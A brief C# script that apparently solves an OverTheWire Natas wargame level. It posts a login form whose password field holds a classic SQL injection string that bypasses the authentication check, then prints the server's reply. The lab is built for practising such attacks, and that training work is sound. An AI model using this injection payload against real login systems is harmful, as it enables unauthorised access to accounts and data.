using System.Net.Http;
using System.Text;

HttpClient client = new HttpClient();
client.BaseAddress = new Uri("http://natas14.natas.labs.overthewire.org");

//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index.php");
//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index-source.html");
HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "/index.php");
string credential = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("natas14:???????????????????????????????????????"));
request.Headers.Add("Authorization", "Basic " + credential);


request.Headers.Add("ContentType", "application/x-www-form-urlencoded");
request.Content = new FormUrlEncodedContent(new[] {
  new KeyValuePair<string, string>("username", "natas15"),
  new KeyValuePair<string, string>("password", "\" or \"1\" = \"1"),
});


HttpResponseMessage httpResponse = await client.SendAsync(request);
httpResponse.EnsureSuccessStatusCode();
String body = await httpResponse.Content.ReadAsStringAsync();
Console.WriteLine(body);
